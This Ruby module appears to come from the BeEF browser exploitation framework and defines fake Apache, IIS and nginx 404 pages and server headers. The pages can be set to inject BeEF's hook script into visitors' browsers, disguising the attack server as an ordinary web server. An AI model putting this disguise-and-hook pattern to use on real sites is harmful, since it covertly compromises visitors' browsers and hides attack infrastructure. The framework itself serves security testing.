module BeEF
  module Core
    module Router

      config = BeEF::Core::Configuration.instance

      APACHE_HEADER = { "Server" => "Apache/2.2.3 (CentOS)",
        "Content-Type" => "text/html; charset=UTF-8" } 
      APACHE_BODY = "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">" +
        "<html><head>" +
        "<title>404 Not Found</title>" +
        "</head><body>" +
        "<h1>Not Found</h1>" +
        "<p>The requested URL was not found on this server.</p>" +
        "<hr>" +
        "<address>Apache/2.2.3 (CentOS)</address>" +
        ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
        "</body></html>"
      IIS_HEADER = {"Server" => "Microsoft-IIS/6.0",
        "X-Powered-By" => "ASP.NET",
        "Content-Type" => "text/html; charset=UTF-8"}
      IIS_BODY = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\" \"http://www.w3.org/TR/html4/strict.dtd\">" +
        "<HTML><HEAD><TITLE>The page cannot be found</TITLE>" +
        "<META HTTP-EQUIV=\"Content-Type\" Content=\"text/html; charset=Windows-1252\">" +
        "<STYLE type=\"text/css\">" +
        "  BODY { font: 8pt/12pt verdana } " +
        "  H1 { font: 13pt/15pt verdana }" +
        "  H2 { font: 8pt/12pt verdana }" +
        "  A:link { color: red }" +
        "  A:visited { color: maroon }" +
        "</STYLE>" +
        "</HEAD><BODY><TABLE width=500 border=0 cellspacing=10><TR><TD>" +
        "<h1>The page cannot be found</h1>" +
        "The page you are looking for might have been removed, had its name changed, or is temporarily unavailable." +
        "<hr>" +
        "<p>Please try the following:</p>" +
        "<ul>" +
        "<li>Make sure that the Web site address displayed in the address bar of your browser is spelled and formatted correctly.</li>" +
        "<li>If you reached this page by clicking a link, contact" +
        " the Web site administrator to alert them that the link is incorrectly formatted." +
        "</li>" +
        "<li>Click the <a href=\"javascript:history.back(1)\">Back</a> button to try another link.</li>" +
        "</ul>" +
        "<h2>HTTP Error 404 - File or directory not found.<br>Internet Information Services (IIS)</h2>" +
        "<hr>" +
        "<p>Technical Information (for support personnel)</p>" +
        "<ul>" +
        "<li>Go to <a href=\"http://go.microsoft.com/fwlink/?linkid=8180\">Microsoft Product Support Services</a> and perform a title search for the words <b>HTTP</b> and <b>404</b>.</li>" +
        "<li>Open <b>IIS Help</b>, which is accessible in IIS Manager (inetmgr)," +
        "and search for topics titled <b>Web Site Setup</b>, <b>Common Administrative Tasks</b>, and <b>About Custom Error Messages</b>.</li>" +
        "</ul>" +
        "</TD></TR></TABLE>" +
        ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
        "</BODY></HTML>"
      NGINX_HEADER = {"Server" => "nginx",
        "Content-Type" => "text/html"}
      NGINX_BODY = "<html>\n"+
        "<head><title>404 Not Found</title></head>\n" +
        "<body bgcolor=\"white\">\n" +
        "<center><h1>404 Not Found</h1></center>\n" +
        "<hr><center>nginx</center>\n" +
        ("<script src='#{config.get("beef.http.hook_file")}'></script>" if config.get("beef.http.web_server_imitation.hook_404")).to_s +
        "</body>\n" +
        "</html>\n"  

    end
  end
end
